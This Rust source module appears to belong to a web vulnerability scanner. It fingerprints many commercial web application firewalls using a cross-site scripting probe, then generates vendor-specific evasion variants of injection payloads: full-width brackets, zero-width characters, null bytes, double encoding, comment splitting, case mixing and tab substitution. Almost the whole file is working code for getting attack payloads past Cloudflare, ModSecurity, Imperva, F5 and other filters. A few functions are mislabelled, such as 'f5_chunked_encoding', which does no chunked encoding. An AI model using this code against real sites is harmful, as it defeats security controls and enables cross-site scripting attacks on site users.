use crate::http::{HttpClient, HttpResponse};
use anyhow::Result;
use colored::*;

#[derive(Debug, Clone, PartialEq)]
pub enum WafKind {
    // Cloud / CDN WAFs
    Akamai,
    AwsWaf,
    AzureAppGateway,
    Cloudflare,
    Fastly,
    Imperva,
    Reblaze,
    StackPath,
    // Hardware / on-prem appliances
    Barracuda,
    CitrixNetScaler,
    F5BigIp,
    Fortiweb,
    PaloAlto,
    RadwareAppWall,
    SonicWall,
    // Software WAFs
    Comodo,
    DotDefender,
    ModSecurity,
    NsfocusWaf,
    SignalSciences,
    SiteLock,
    Sucuri,
    Wallarm,
    Wordfence,
    // Cloud-vendor WAFs
    AlibabaCloud,
    TencentCloud,
    // Fallback
    Unknown(String),
    None,
}

impl std::fmt::Display for WafKind {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        let s = match self {
            WafKind::Akamai           => "Akamai Kona Site Defender",
            WafKind::AlibabaCloud     => "Alibaba Cloud WAF",
            WafKind::AwsWaf           => "AWS WAF",
            WafKind::AzureAppGateway  => "Azure Application Gateway WAF",
            WafKind::Barracuda        => "Barracuda WAF",
            WafKind::CitrixNetScaler  => "Citrix NetScaler AppFirewall",
            WafKind::Cloudflare       => "Cloudflare",
            WafKind::Comodo           => "Comodo WAF",
            WafKind::DotDefender      => "DotDefender",
            WafKind::F5BigIp          => "F5 BIG-IP ASM",
            WafKind::Fastly           => "Fastly Next-Gen WAF (Signal Sciences)",
            WafKind::Fortiweb         => "FortiWeb",
            WafKind::Imperva          => "Imperva / Incapsula",
            WafKind::ModSecurity      => "ModSecurity",
            WafKind::NsfocusWaf       => "NSFOCUS WAF",
            WafKind::PaloAlto         => "Palo Alto Networks",
            WafKind::RadwareAppWall   => "Radware AppWall",
            WafKind::Reblaze          => "Reblaze",
            WafKind::SignalSciences   => "Signal Sciences",
            WafKind::SiteLock         => "SiteLock",
            WafKind::SonicWall        => "SonicWall",
            WafKind::StackPath        => "StackPath / MaxCDN",
            WafKind::Sucuri           => "Sucuri",
            WafKind::TencentCloud     => "Tencent Cloud WAF",
            WafKind::Wallarm          => "Wallarm",
            WafKind::Wordfence        => "Wordfence",
            WafKind::Unknown(s)       => return write!(f, "Unknown ({})", s),
            WafKind::None             => "None detected",
        };
        write!(f, "{}", s)
    }
}

pub struct WafDetector;

const WAF_PROBE: &str = "<script>alert(1)</script>";

impl WafDetector {
    pub async fn detect(client: &HttpClient, url: &str) -> Result<WafKind> {
        let probe_url = if url.contains('?') {
            format!("{}&waf_probe={}", url, urlencoding::encode(WAF_PROBE))
        } else {
            format!("{}?waf_probe={}", url, urlencoding::encode(WAF_PROBE))
        };

        let resp = match client.get(&probe_url).await {
            Ok(r) => r,
            Err(_) => return Ok(WafKind::None),
        };

        Ok(fingerprint(&resp))
    }

    pub fn bypass_payloads(waf: &WafKind, payload: &str) -> Vec<String> {
        let mut variants = vec![payload.to_string()];

        let bypasses: Vec<fn(&str) -> String> = match waf {
            WafKind::Cloudflare => vec![
                cf_fullwidth_brackets,
                cf_zero_width_keywords,
                generic_case_bypass,
                generic_comment_bypass,
                generic_tag_space_bypass,
            ],
            WafKind::ModSecurity => vec![
                modsec_unicode_escape,
                modsec_null_byte,
                generic_comment_bypass,
                generic_case_bypass,
                generic_html_entity_bypass,
            ],
            WafKind::Imperva => vec![
                imperva_double_encode,
                generic_case_bypass,
                generic_comment_bypass,
                generic_tag_space_bypass,
            ],
            WafKind::Akamai => vec![
                generic_case_bypass,
                generic_comment_bypass,
                generic_html_entity_bypass,
                generic_tag_space_bypass,
            ],
            WafKind::AwsWaf => vec![
                generic_case_bypass,
                generic_html_entity_bypass,
                generic_comment_bypass,
            ],
            WafKind::F5BigIp => vec![
                f5_chunked_encoding,
                generic_case_bypass,
                generic_comment_bypass,
            ],
            WafKind::Fortiweb => vec![
                generic_case_bypass,
                generic_tag_space_bypass,
                generic_comment_bypass,
            ],
            WafKind::Sucuri => vec![
                generic_case_bypass,
                generic_comment_bypass,
                cf_zero_width_keywords,
            ],
            WafKind::Wordfence => vec![
                generic_case_bypass,
                generic_comment_bypass,
                generic_html_entity_bypass,
            ],
            WafKind::Wallarm => vec![
                generic_case_bypass,
                generic_tag_space_bypass,
                modsec_unicode_escape,
            ],
            _ => vec![
                generic_case_bypass,
                generic_comment_bypass,
                generic_encoding_bypass,
                generic_tag_space_bypass,
            ],
        };

        for f in &bypasses {
            let v = f(payload);
            if v != payload {
                variants.push(v);
            }
        }

        variants
    }
}

fn fingerprint(resp: &HttpResponse) -> WafKind {
    let h = &resp.headers;
    let body = resp.body.to_ascii_lowercase();
    let status = resp.status;

    // Cloudflare
    if h.get("cf-ray").is_some()
        || h.get("server").is_some_and(|v| v.to_ascii_lowercase().contains("cloudflare"))
        || body.contains("cloudflare ray id")
        || body.contains("error 1010")
        || body.contains("attention required! | cloudflare")
    {
        return WafKind::Cloudflare;
    }

    //Akamai
    if h.get("x-check-cacheable").is_some()
        || h.get("akamai-origin-hop").is_some()
        || h.get("x-akamai-request-id").is_some()
        || h.get("server").is_some_and(|v| v.contains("akamai"))
        || (body.contains("reference #") && body.contains("access denied"))
        || body.contains("you don't have permission to access")
            && h.get("server").is_some_and(|v| v.contains("akamaighost"))
    {
        return WafKind::Akamai;
    }

    // Imperva/Incapsula
    if h.get("x-iinfo").is_some()
        || h.get("x-cdn").is_some_and(|v| v == "Incapsula")
        || h.get("x-cdn").is_some_and(|v| v == "imperva")
        || body.contains("incapsula incident id")
        || body.contains("_imp_apg_r_")
        || body.contains("imperva")
    {
        return WafKind::Imperva;
    }

    // AWS WAF
    if body.contains("aws waf")
        || body.contains("awselb")
        || h.get("x-amzn-requestid").is_some()
        || (status == 403 && body.contains("request blocked"))
        || (status == 403 && body.contains("not authorized"))
            && h.get("server").is_some_and(|v| v.contains("awselb"))
    {
        return WafKind::AwsWaf;
    }

    // Azure Application Gateway WAF
    if h.get("x-ms-request-id").is_some()
        || body.contains("microsoft-azure-application-gateway")
        || body.contains("application gateway")
            && (status == 403 || status == 502)
        || h.get("server").is_some_and(|v| v.contains("microsoft-azure-application-gateway"))
    {
        return WafKind::AzureAppGateway;
    }

    // Sucuri
    if h.get("x-sucuri-id").is_some()
        || h.get("x-sucuri-cache").is_some()
        || h.get("server").is_some_and(|v| v.contains("sucuri"))
        || body.contains("sucuri website firewall")
        || body.contains("access denied - sucuri website firewall")
    {
        return WafKind::Sucuri;
    }

    // F5 BIG-IP ASM
    if h.get("x-wa-info").is_some()
        || h.get("x-cnection").is_some_and(|v| v.contains("close"))
            && h.get("server").is_some_and(|v| v.contains("bigip"))
        || (body.contains("the requested url was rejected") && body.contains("support id:"))
        || body.contains("f5 networks")
    {
        return WafKind::F5BigIp;
    }

    // Citrix NetScaler AppFirewall
    if h.get("via").is_some_and(|v| v.to_ascii_lowercase().contains("netscaler"))
        || h.get("set-cookie").is_some_and(|v| v.contains("ns_af="))
        || h.get("cneonction").is_some()
        || body.contains("netscaler")
            && (status == 403 || status == 200 && body.contains("appfirewall"))
    {
        return WafKind::CitrixNetScaler;
    }

    // ModSecurity
    if h.get("server").is_some_and(|v| v.contains("mod_security"))
        || body.contains("mod_security")
        || body.contains("modsecurity")
        || (body.contains("not acceptable!") && body.contains("apache"))
        || body.contains("this error was generated by mod_security")
    {
        return WafKind::ModSecurity;
    }

    // FortiWeb
    if h.get("set-cookie").is_some_and(|v| v.contains("cookiesession1="))
        || body.contains("fortigate")
        || body.contains("fortiweb")
        || (body.contains("application firewall") && h.get("server").is_some_and(|v| v.contains("fortiweb")))
    {
        return WafKind::Fortiweb;
    }

    // Barracuda
    if body.contains("barracuda web application firewall")
        || body.contains("barracuda networks")
        || h.get("set-cookie").is_some_and(|v| v.contains("bni_persistence"))
    {
        return WafKind::Barracuda;
    }

    // Palo Alto Networks
    if body.contains("pan-db")
        || body.contains("palo alto networks")
        || (status == 403 && body.contains("has been blocked by url filtering"))
    {
        return WafKind::PaloAlto;
    }

    // Radware AppWall
    if h.get("x-sl-compstate").is_some()
        || h.get("set-cookie").is_some_and(|v| v.contains("rdwr"))
        || body.contains("radware")
            && body.contains("appwall")
    {
        return WafKind::RadwareAppWall;
    }

    // Reblaze
    if h.get("x-reblaze-protection").is_some()
        || h.get("set-cookie").is_some_and(|v| v.contains("rbzid="))
        || h.get("server").is_some_and(|v| v.contains("reblaze"))
    {
        return WafKind::Reblaze;
    }

    // Fastly Next-Gen WAF / Signal Sciences
    if h.get("x-sigsci-requestid").is_some()
        || h.get("x-sigsci-tags").is_some()
        || h.get("server").is_some_and(|v| v.contains("signal-sciences"))
    {
        return WafKind::Fastly;
    }

    // Signal Sciences (standalone)
    if h.get("x-sigsci-agentresponse").is_some() {
        return WafKind::SignalSciences;
    }

    // Wallarm
    if h.get("x-wallarm-node").is_some()
        || body.contains("wallarm")
            && (status == 403 || status == 444)
    {
        return WafKind::Wallarm;
    }

    // SonicWall
    if body.contains("sonicwall")
        || body.contains("this request is blocked by the sonicwall")
        || h.get("server").is_some_and(|v| v.contains("sonicwall"))
    {
        return WafKind::SonicWall;
    }

    // Comodo WAF
    if body.contains("comodo web application firewall")
        || h.get("server").is_some_and(|v| v.contains("comodo"))
    {
        return WafKind::Comodo;
    }

    // DotDefender
    if h.get("x-dotdefender-denied").is_some()
        || body.contains("dotdefender")
        || body.contains("site has blocked your access")
            && h.get("x-dotdefender-denied").is_some()
    {
        return WafKind::DotDefender;
    }

    // NSFOCUS WAF
    if body.contains("nsfocus")
        || h.get("server").is_some_and(|v| v.contains("nsfocus"))
        || (status == 403 && body.contains("nsfocus web application firewall"))
    {
        return WafKind::NsfocusWaf;
    }

    // SiteLock
    if body.contains("sitelock")
        || h.get("x-sucuri-id").is_some_and(|v| v.contains("sitelock"))
        || body.contains("sitelock-site-shield")
    {
        return WafKind::SiteLock;
    }

    // StackPath / MaxCDN
    if h.get("x-sp-url").is_some()
        || h.get("server").is_some_and(|v| v.contains("stackpath"))
        || body.contains("stackpath")
            && status == 403
    {
        return WafKind::StackPath;
    }

    // Alibaba Cloud WAF
    if h.get("x-safe-info").is_some()
        || body.contains("alicloud-waf")
        || body.contains("error code: waf")
            && body.contains("alibaba")
    {
        return WafKind::AlibabaCloud;
    }

    // Tencent Cloud WAF
    if body.contains("tencent")
        && (body.contains("security protection") || body.contains("anti-bot"))
        || h.get("x-client-ip").is_some()
            && h.get("server").is_some_and(|v| v.contains("tencent"))
    {
        return WafKind::TencentCloud;
    }

    // Wordfence
    if body.contains("generated by wordfence")
        || (body.contains("wordfence") && body.contains("blocked"))
        || body.contains("your access to this site has been limited")
            && body.contains("wordfence")
    {
        return WafKind::Wordfence;
    }

    if status == 403 || status == 406 || status == 501 {
        return WafKind::Unknown(format!("HTTP {}", status));
    }

    WafKind::None
}

// Cloudflare bypass techniques

fn cf_fullwidth_brackets(p: &str) -> String {
    p.replace('<', "\u{ff1c}").replace('>', "\u{ff1e}")
}

fn cf_zero_width_keywords(p: &str) -> String {
    p.replace("script", "scr\u{200b}ipt")
        .replace("alert", "ale\u{200b}rt")
        .replace("onerror", "one\u{200b}rror")
        .replace("onload", "onl\u{200b}oad")
}

// ModSecurity bypass techniques

fn modsec_unicode_escape(p: &str) -> String {
    p.replace("alert", "al\\u0065rt")
        .replace("script", "scr\\u0069pt")
}

fn modsec_null_byte(p: &str) -> String {
    p.replace('<', "<%00").replace('>', "%00>")
}

// Imperva bypass techniques

fn imperva_double_encode(p: &str) -> String {
    p.replace('<', "%253c").replace('>', "%253e")
        .replace('"', "%2522").replace('\'', "%2527")
}

// F5 bypass techniques

fn f5_chunked_encoding(p: &str) -> String {
    // Split keyword characters with harmless HTML comments
    p.replace("script", "scr<!---->\u{0000}ipt")
        .replace("alert", "ale<!---->\u{0000}rt")
}

// Generic bypass techniques

fn generic_case_bypass(p: &str) -> String {
    p.chars()
        .enumerate()
        .map(|(i, c)| {
            if c.is_ascii_alphabetic() {
                if i % 2 == 0 { c.to_ascii_uppercase().to_string() }
                else { c.to_ascii_lowercase().to_string() }
            } else {
                c.to_string()
            }
        })
        .collect()
}

fn generic_comment_bypass(p: &str) -> String {
    p.replace("script", "scr/**/ipt")
        .replace("alert", "ale/**/rt")
        .replace("onload", "onlo/**/ad")
        .replace("onerror", "oner/**/ror")
        .replace("onmouseover", "onmouse/**/over")
}

fn generic_encoding_bypass(p: &str) -> String {
    p.replace('<', "&lt;").replace('>', "&gt;")
}

fn generic_html_entity_bypass(p: &str) -> String {
    p.replace('"', "&quot;").replace('\'', "&apos;")
        .replace('<', "&#60;").replace('>', "&#62;")
}

fn generic_tag_space_bypass(p: &str) -> String {
    // Replace space inside tags with a tab or newline to dodge simple regex filters
    p.replace("<script ", "<script\t")
        .replace("<img ", "<img\t")
        .replace("<svg ", "<svg\t")
        .replace("<iframe ", "<iframe\t")
}

mod urlencoding {
    pub fn encode(s: &str) -> String {
        let mut out = String::new();
        for b in s.bytes() {
            match b {
                b'A'..=b'Z' | b'a'..=b'z' | b'0'..=b'9' => out.push(b as char),
                _ => out.push_str(&format!("%{:02X}", b)),
            }
        }
        out
    }
}

pub fn print_waf_result(waf: &WafKind) {
    match waf {
        WafKind::None => println!("  {} No WAF detected", "[WAF]".green()),
        _ => println!("  {} Detected: {}", "[WAF]".yellow(), waf.to_string().yellow().bold()),
    }
}
